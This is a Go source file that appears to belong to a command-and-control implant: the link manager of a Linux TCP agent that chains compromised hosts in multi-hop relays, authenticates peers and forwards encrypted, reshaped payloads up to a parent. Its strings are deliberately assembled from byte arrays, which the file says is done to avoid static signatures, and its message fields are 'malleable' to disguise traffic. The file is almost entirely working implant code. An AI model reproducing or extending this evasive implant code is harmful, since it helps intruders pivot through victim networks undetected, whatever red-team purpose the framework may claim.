// server/docker/payloads/TCP_Linux/link_manager.go
// Link manager for connecting to other TCP agents (multi-hop chains)

//go:build linux
// +build linux

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// Link manager strings (constructed to avoid static signatures)
var (
	lmKeyType       = string([]byte{0x74, 0x79, 0x70, 0x65})                       // type
	lmKeyPayload    = string([]byte{0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64})     // payload
	lmTypeData      = string([]byte{0x64, 0x61, 0x74, 0x61})                       // data
	lmTypeDisconn   = string([]byte{0x64, 0x69, 0x73, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74}) // disconnect
	lmTypeHandshake = string([]byte{0x68, 0x61, 0x6e, 0x64, 0x73, 0x68, 0x61, 0x6b, 0x65})       // handshake
	lmStatusActive  = string([]byte{0x61, 0x63, 0x74, 0x69, 0x76, 0x65})           // active
	lmStatusInact   = string([]byte{0x69, 0x6e, 0x61, 0x63, 0x74, 0x69, 0x76, 0x65}) // inactive
	lmFmtLinks      = string([]byte{0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x20, 0x4c, 0x69, 0x6e, 0x6b, 0x73, 0x20, 0x28, 0x25, 0x64, 0x29, 0x3a, 0x0a}) // Active Links (%d):\n
	lmFmtLinkRow    = string([]byte{0x20, 0x20, 0x5b, 0x25, 0x73, 0x5d, 0x20, 0x25, 0x73, 0x20, 0x2d, 0x20, 0x25, 0x73, 0x20, 0x28, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x65, 0x64, 0x3a, 0x20, 0x25, 0x73, 0x2c, 0x20, 0x6c, 0x61, 0x73, 0x74, 0x20, 0x73, 0x65, 0x65, 0x6e, 0x3a, 0x20, 0x25, 0x73, 0x29, 0x0a}) //   [%s] %s - %s (connected: %s, last seen: %s)\n
	lmTimeFmt       = string([]byte{0x31, 0x35, 0x3a, 0x30, 0x34, 0x3a, 0x30, 0x35}) // 15:04:05
)

// LinkedAgent represents a connected TCP agent (child link)
type LinkedAgent struct {
	RoutingID         string    // Short routing ID (assigned by this agent)
	Address           string    // TCP address (host:port)
	Conn              net.Conn  // Active TCP connection
	Connected         time.Time // When the link was established
	LastSeen          time.Time // Last successful communication
	IsActive          bool      // Whether the link is active
	AwaitingHandshake bool      // True after auth, false after first message (for state-based routing)
	mu                sync.Mutex
}

// WriteMessage writes a length-prefixed message to the linked agent
func (la *LinkedAgent) WriteMessage(data []byte) error {
	la.mu.Lock()
	defer la.mu.Unlock()

	if la.Conn == nil || !la.IsActive {
		return fmt.Errorf(Err(E4))
	}

	return writeMessage(la.Conn, data)
}

// LinkManager manages connections to linked TCP agents (child links)
type LinkManager struct {
	mu            sync.RWMutex
	links         map[string]*LinkedAgent // routingID -> LinkedAgent
	addressToRoute map[string]string      // address -> routingID (for dedup)
	nextID        uint32                  // Atomic counter for generating routing IDs
	outboundData  chan *LinkDataOut       // Data received from linked agents, to be sent up the chain
	handshakeData chan *LinkDataOut       // Handshake data from new linked agents (sent via "lh" field)

	// Response channels for synchronous command/response patterns
	responseChannels map[string]chan *LinkDataOut // routingID -> response channel
	responseMu       sync.RWMutex

	// Unlink notifications to be sent to server
	unlinkNotifications chan string // Routing IDs that have been unlinked
}

// LinkDataOut represents data from a linked agent to be forwarded up the chain
type LinkDataOut struct {
	RoutingID     string `json:"r"`            // Routing ID
	Payload       string `json:"p"`            // Base64 encoded, encrypted payload (or opaque transformed blob)
	PrependLength int    `json:"pl,omitempty"` // Random prepend length for transform reversal
	AppendLength  int    `json:"al,omitempty"` // Random append length for transform reversal
}

// LinkDataIn represents data from the server destined for a linked agent
type LinkDataIn struct {
	RoutingID string `json:"r"` // Routing ID
	Payload   string `json:"p"` // Base64 encoded payload
}

// ToMalleableMap converts LinkDataOut to a map using configurable field names
// This avoids hardcoded JSON struct tags when marshaling
func (ld *LinkDataOut) ToMalleableMap() map[string]interface{} {
	m := map[string]interface{}{
		MALLEABLE_ROUTING_ID_FIELD: ld.RoutingID,
		MALLEABLE_PAYLOAD_FIELD:    ld.Payload,
	}
	if ld.PrependLength > 0 {
		m["pl"] = ld.PrependLength
	}
	if ld.AppendLength > 0 {
		m["al"] = ld.AppendLength
	}
	return m
}

// ConvertLinkDataToMaps converts a slice of LinkDataOut to maps with malleable field names
func ConvertLinkDataToMaps(data []*LinkDataOut) []map[string]interface{} {
	if data == nil {
		return nil
	}
	result := make([]map[string]interface{}, len(data))
	for i, ld := range data {
		result[i] = ld.ToMalleableMap()
	}
	return result
}

var (
	tcpLinkManager     *LinkManager
	tcpLinkManagerOnce sync.Once
)

// GetLinkManager returns the singleton link manager
func GetLinkManager() *LinkManager {
	tcpLinkManagerOnce.Do(func() {
		tcpLinkManager = &LinkManager{
			links:               make(map[string]*LinkedAgent),
			addressToRoute:     make(map[string]string),
			outboundData:        make(chan *LinkDataOut, 100),
			handshakeData:       make(chan *LinkDataOut, 10),
			responseChannels:    make(map[string]chan *LinkDataOut),
			unlinkNotifications: make(chan string, 100),
		}
	})
	return tcpLinkManager
}

// GenerateRoutingID creates a short, unique routing ID
func (lm *LinkManager) GenerateRoutingID() string {
	id := atomic.AddUint32(&lm.nextID, 1)
	return fmt.Sprintf("%x", id)
}

// Link establishes a connection to another TCP agent
func (lm *LinkManager) Link(address string) (string, error) {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	// Check if already linked to this address
	if existingRoute, exists := lm.addressToRoute[address]; exists {
		if link, ok := lm.links[existingRoute]; ok && link.IsActive {
			return "", fmt.Errorf(Err(E5))
		}
	}

	// Connect via TCP
	conn, err := dialTCP(address, 30*time.Second)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	// Perform HMAC-based authentication with the TCP agent
	if err := performLinkAuthTCP(conn); err != nil {
		conn.Close()
		return "", fmt.Errorf(ErrCtx(E3, err.Error()))
	}

	// Generate routing ID
	routingID := lm.GenerateRoutingID()

	// Create linked agent entry
	link := &LinkedAgent{
		RoutingID:         routingID,
		Address:           address,
		Conn:              conn,
		Connected:         time.Now(),
		LastSeen:          time.Now(),
		IsActive:          true,
		AwaitingHandshake: true, // First message after auth is always handshake
	}

	// Store the link
	lm.links[routingID] = link
	lm.addressToRoute[address] = routingID

	// Start goroutine to handle incoming data from the TCP agent
	go lm.handleIncomingData(link)

	return routingID, nil
}

// Unlink disconnects from a TCP agent
func (lm *LinkManager) Unlink(routingID string) error {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	link, exists := lm.links[routingID]
	if !exists {
		return fmt.Errorf(Err(E4))
	}

	// Send graceful disconnect message
	if link.IsActive && link.Conn != nil {
		sendDisconnectMessage(link.Conn)
	}

	// Close the connection
	if link.Conn != nil {
		link.Conn.Close()
	}

	link.IsActive = false

	// Queue unlink notification to be sent up the chain
	select {
	case lm.unlinkNotifications <- routingID:
	default:
	}

	// Remove from maps
	delete(lm.addressToRoute, link.Address)
	delete(lm.links, routingID)

	return nil
}

// GetLink returns a linked agent by routing ID
func (lm *LinkManager) GetLink(routingID string) (*LinkedAgent, bool) {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	link, exists := lm.links[routingID]
	if !exists || !link.IsActive {
		return nil, false
	}
	return link, true
}

// GetActiveLinks returns all active linked agents
func (lm *LinkManager) GetActiveLinks() []*LinkedAgent {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	var active []*LinkedAgent
	for _, link := range lm.links {
		if link.IsActive {
			active = append(active, link)
		}
	}
	return active
}

// ForwardToLinkedAgent sends data from parent to a linked (child) agent
// If transformed=true, the payload is base64-encoded transformed data that should be
// sent as raw bytes (the child will reverse transforms). Otherwise, wrap in JSON envelope.
func (lm *LinkManager) ForwardToLinkedAgent(routingID string, payload string, transformed bool) error {
	link, exists := lm.GetLink(routingID)
	if !exists {
		return fmt.Errorf(Err(E4))
	}

	link.mu.Lock()
	defer link.mu.Unlock()

	if link.Conn == nil || !link.IsActive {
		return fmt.Errorf(Err(E4))
	}

	var data []byte
	var err error

	if transformed {
		data, err = base64.StdEncoding.DecodeString(payload)
		if err != nil {
			return fmt.Errorf(ErrCtx(E18, err.Error()))
		}
	} else {
		message := map[string]string{
			lmKeyType:    lmTypeData,
			lmKeyPayload: payload,
		}

		data, err = json.Marshal(message)
		if err != nil {
			return fmt.Errorf(ErrCtx(E18, err.Error()))
		}
	}

	if err := writeMessage(link.Conn, data); err != nil {
		link.IsActive = false
		return fmt.Errorf(ErrCtx(E11, err.Error()))
	}

	link.LastSeen = time.Now()
	return nil
}

// ForwardToLinkedAgentAndWait sends data to a linked agent and waits for a response
// If transformed=true, the payload is base64-encoded transformed data that should be sent as raw bytes
func (lm *LinkManager) ForwardToLinkedAgentAndWait(routingID string, payload string, transformed bool, timeout time.Duration) (*LinkDataOut, error) {
	// Create a response channel for this routing ID
	respChan := make(chan *LinkDataOut, 1)

	lm.responseMu.Lock()
	lm.responseChannels[routingID] = respChan
	lm.responseMu.Unlock()

	// Clean up when done
	defer func() {
		lm.responseMu.Lock()
		delete(lm.responseChannels, routingID)
		lm.responseMu.Unlock()
	}()

	if err := lm.ForwardToLinkedAgent(routingID, payload, transformed); err != nil {
		return nil, err
	}

	select {
	case response := <-respChan:
		return response, nil
	case <-time.After(timeout):
		return nil, nil
	}
}

// WaitForLinkData waits for data from a specific routing ID with timeout
func (lm *LinkManager) WaitForLinkData(routingID string, timeout time.Duration) (*LinkDataOut, error) {
	// Create a response channel for this routing ID
	respChan := make(chan *LinkDataOut, 1)

	lm.responseMu.Lock()
	lm.responseChannels[routingID] = respChan
	lm.responseMu.Unlock()

	// Clean up when done
	defer func() {
		lm.responseMu.Lock()
		delete(lm.responseChannels, routingID)
		lm.responseMu.Unlock()
	}()

	// Wait for response with timeout
	select {
	case response := <-respChan:
		return response, nil
	case <-time.After(timeout):
		return nil, fmt.Errorf(Err(E9))
	}
}

// GetOutboundData returns data that needs to be sent up the chain to parent
func (lm *LinkManager) GetOutboundData() []*LinkDataOut {
	var data []*LinkDataOut

	// Drain the channel (non-blocking)
	for {
		select {
		case item := <-lm.outboundData:
			data = append(data, item)
		default:
			return data
		}
	}
}

// GetHandshakeData returns a single handshake to send to parent (via "lh" field)
// Returns nil if no handshake is pending
func (lm *LinkManager) GetHandshakeData() *LinkDataOut {
	select {
	case handshake := <-lm.handshakeData:
		return handshake
	default:
		return nil
	}
}

// GetUnlinkNotifications returns routing IDs that have been unlinked
func (lm *LinkManager) GetUnlinkNotifications() []string {
	var notifications []string

	// Drain the channel (non-blocking)
	for {
		select {
		case routingID := <-lm.unlinkNotifications:
			notifications = append(notifications, routingID)
		default:
			return notifications
		}
	}
}

// handleIncomingData reads data from a linked agent and queues it for the parent
func (lm *LinkManager) handleIncomingData(link *LinkedAgent) {
	defer func() {
		link.mu.Lock()
		link.IsActive = false
		link.mu.Unlock()
	}()

	for {
		// Read length-prefixed message
		data, err := readMessage(link.Conn)
		if err != nil {
			return
		}

		// Try to parse as JSON
		var message map[string]string
		if err := json.Unmarshal(data, &message); err == nil && message[lmKeyType] != "" {
			// Valid JSON with type field - process normally
			msgType := message[lmKeyType]

			switch msgType {
			case lmTypeData:
				// Build outbound data
				outbound := &LinkDataOut{
					RoutingID: link.RoutingID,
					Payload:   message[lmKeyPayload],
				}

				// Deliver to sync waiter or async queue
				lm.deliverOutbound(link, outbound)

				// Clear handshake state after first data message
				link.mu.Lock()
				link.AwaitingHandshake = false
				link.mu.Unlock()

			case lmTypeHandshake:
				// Initial handshake from agent - queue for parent to forward up the chain via "lh" field
				outbound := &LinkDataOut{
					RoutingID: link.RoutingID,
					Payload:   message[lmKeyPayload],
				}
				lm.queueHandshakeData(outbound)

				// Clear handshake state
				link.mu.Lock()
				link.AwaitingHandshake = false
				link.mu.Unlock()

			case lmTypeDisconn:
				return
			}
		} else {
			// Not valid JSON or no type field - treat as raw transformed data
			// Child agent (SMB) sent pre-transformed blob, base64 encode and forward as opaque
			link.mu.Lock()
			isHandshake := link.AwaitingHandshake
			link.AwaitingHandshake = false // First message consumed
			link.mu.Unlock()

			// Base64 encode the raw transformed data for transport
			outbound := &LinkDataOut{
				RoutingID: link.RoutingID,
				Payload:   base64.StdEncoding.EncodeToString(data),
			}

			if isHandshake {
				// First message after auth = handshake
				lm.queueHandshakeData(outbound)
			} else {
				// Subsequent messages = data
				lm.deliverOutbound(link, outbound)
			}
		}

		link.mu.Lock()
		link.LastSeen = time.Now()
		link.mu.Unlock()
	}
}

// deliverOutbound delivers data to synchronous waiter or queues for async processing
func (lm *LinkManager) deliverOutbound(link *LinkedAgent, outbound *LinkDataOut) {
	// Check if someone is waiting synchronously for this response
	lm.responseMu.RLock()
	respChan, hasSyncWaiter := lm.responseChannels[link.RoutingID]
	lm.responseMu.RUnlock()

	if hasSyncWaiter {
		// Send to synchronous waiter (non-blocking)
		select {
		case respChan <- outbound:
		default:
			// Channel full or closed, fall back to async queue
			lm.queueOutboundData(outbound)
		}
	} else {
		// No synchronous waiter, queue for normal async processing
		lm.queueOutboundData(outbound)
	}
}

// queueOutboundData is a helper to queue data for async delivery to parent
func (lm *LinkManager) queueOutboundData(outbound *LinkDataOut) {
	select {
	case lm.outboundData <- outbound:
	default:
	}
}

// queueHandshakeData is a helper to queue handshake data for async delivery to parent via "lh" field
func (lm *LinkManager) queueHandshakeData(data *LinkDataOut) {
	select {
	case lm.handshakeData <- data:
	default:
	}
}

// ListLinks returns a summary of all linked agents
func (lm *LinkManager) ListLinks() string {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	if len(lm.links) == 0 {
		return Succ(S0)
	}

	result := fmt.Sprintf(lmFmtLinks, len(lm.links))
	for routingID, link := range lm.links {
		status := lmStatusActive
		if !link.IsActive {
			status = lmStatusInact
		}
		result += fmt.Sprintf(lmFmtLinkRow,
			routingID, link.Address, status,
			link.Connected.Format(lmTimeFmt),
			link.LastSeen.Format(lmTimeFmt))
	}
	return result
}

// Helper functions

func sendDisconnectMessage(conn net.Conn) {
	message := map[string]string{lmKeyType: lmTypeDisconn}
	data, _ := json.Marshal(message)
	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	writeMessage(conn, data)
}

func writeMessage(conn net.Conn, data []byte) error {
	// Length-prefixed message: 4-byte little-endian length + data
	length := uint32(len(data))
	header := []byte{
		byte(length),
		byte(length >> 8),
		byte(length >> 16),
		byte(length >> 24),
	}

	if _, err := conn.Write(header); err != nil {
		return err
	}
	_, err := conn.Write(data)
	return err
}

func readMessage(conn net.Conn) ([]byte, error) {
	// Read 4-byte length header
	header := make([]byte, 4)
	if _, err := conn.Read(header); err != nil {
		return nil, err
	}

	length := uint32(header[0]) | uint32(header[1])<<8 | uint32(header[2])<<16 | uint32(header[3])<<24

	// Sanity check
	if length > 10*1024*1024 { // 10MB max
		return nil, fmt.Errorf(Err(E2))
	}

	// Read data
	data := make([]byte, length)
	totalRead := 0
	for totalRead < int(length) {
		n, err := conn.Read(data[totalRead:])
		if err != nil {
			return nil, err
		}
		totalRead += n
	}

	return data, nil
}
